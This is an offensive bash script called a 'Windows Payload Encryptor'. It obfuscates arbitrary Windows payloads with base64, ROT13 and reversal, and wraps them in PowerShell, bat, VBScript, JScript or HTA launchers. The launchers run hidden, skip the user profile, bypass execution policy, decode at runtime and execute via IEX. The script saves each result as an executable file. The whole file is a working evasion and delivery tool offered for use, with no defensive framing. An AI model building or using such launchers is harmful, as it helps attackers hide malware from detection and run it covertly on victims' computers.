#!/bin/bash

# Ctrl+C
trap "echo -e '\n\e[1;31m[!] Exiting...\e[0m'; exit" INT

# Banner
banner() {
  echo -e "\e[1;32m"
  echo "=============================================="
  echo "       🐚 Windows Payload Encryptor - Bash      "
  echo "      ⚙️  Encoding: Base64 + ROT13 + Reverse       "
  echo "   🔒 Suitable for .ps1, .bat, .vbs, .js, .hta   "
  echo "=============================================="
  echo -e "\e[0m"
}

# Encrypt function
encrypt_logic() {
  local input="$1"
  local b64=$(printf '%s' "$input" | base64 -w 0)
  local rot13=$(echo "$b64" | tr 'A-Za-z' 'N-ZA-Mn-za-m')
  local reversed=$(echo "$rot13" | rev)
  echo "$reversed"
}

# Generate final payload depending on type
generate_payload() {
  local enc="$1"
  local type="$2"

  # PowerShell decryption logic
  local ps_decode="\$r=[string]::Join('', (\$e.ToCharArray() | [Array]::Reverse(\$_); \$_));"
  ps_decode+="\$rot='';foreach(\$c in \$r.ToCharArray()){"
  ps_decode+="if(\$c -cmatch '[A-Za-z]'){"
  ps_decode+="\$base=([char]\$c -cmatch '[A-Z]')?65:97;"
  ps_decode+="\$rot+=([char]((([int][char]\$c - \$base + 13) %% 26) + \$base))"
  ps_decode+="}else{\$rot+=\$c}};"
  ps_decode+="\$decoded=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(\$rot));IEX \$decoded"

  case "$type" in
    ps1|powershell)
      echo "powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"\$e='$enc'; $ps_decode\""
      ;;
    bat)
      echo "powershell -NoP -NonI -W Hidden -Command \"\$e='$enc'; $ps_decode\""
      ;;
    vbs)
      echo "Set s = CreateObject(\"WScript.Shell\")" 
      echo "s.Run \"powershell -NoP -NonI -W Hidden -Command \$e='$enc'; $ps_decode\""
      ;;
    js)
      echo "var s = new ActiveXObject(\"WScript.Shell\");"
      echo "s.Run(\"powershell -w hidden -c \\\"\$e='$enc'; $ps_decode\\\"\");"
      ;;
    hta)
      echo "<script>"
      echo "new ActiveXObject(\"WScript.Shell\").Run(\"powershell -w hidden -c \\\"\$e='$enc'; $ps_decode\\\"\")"
      echo "</script>"
      ;;
    *)
      echo -e "\e[1;31m[!] Unsupported payload type.\e[0m"
      ;;
  esac
}

# Manual input
encrypt_custom() {
  echo -e "\e[1;33m[*] Enter your Windows payload (PowerShell, etc). Ctrl+D to finish:\e[0m"
  input=$(</dev/stdin)

  if [[ -z "$input" ]]; then
    echo -e "\e[1;31m[!] Empty payload!\e[0m"
    return
  fi

  read -p $'\e[1;36m[?] Enter payload type (ps1 / bat / vbs / js / hta): \e[0m' ptype
  enc=$(encrypt_logic "$input")
  echo -e "\n\e[1;32m[+] Encrypted Payload:\e[0m"
  generate_payload "$enc" "$ptype"
}

# File input
encrypt_from_file() {
  read -p $'\e[1;33m[*] Enter path to payload file:\e[0m ' filepath

  if [[ ! -f "$filepath" ]]; then
    echo -e "\e[1;31m[!] File not found!\e[0m"
    return
  fi

  read -p $'\e[1;36m[?] Enter payload type (ps1 / bat / vbs / js / hta): \e[0m' ptype

  content=$(<"$filepath")
  enc=$(encrypt_logic "$content")
  final=$(generate_payload "$enc" "$ptype")

  filename=$(basename -- "$filepath")
  name="${filename%.*}"
  output="${name}-encrypted.${ptype}"

  echo "$final" > "$output"
  chmod +x "$output"
    echo -e "\n\e[1;32m[+] Encrypted payload saved as:\e[0m \e[1;36m$output\e[0m"
}

# Menu
menu() {
  while true; do
    echo -e "\n\e[1;34mChoose an option:\e[0m"
    echo -e "\e[1;33m[1]\e[0m Encrypt custom payload"
    echo -e "\e[1;33m[2]\e[0m Encrypt payload from file"
    read -p $'\e[1;33mSelect option [1-2]: \e[0m' opt

    case "$opt" in
      1) encrypt_custom; break ;;
      2) encrypt_from_file; break ;;
      *) echo -e "\e[1;31m[!] Invalid option. Try again.\e[0m" ;;
    esac
  done
}

clear
banner
menu
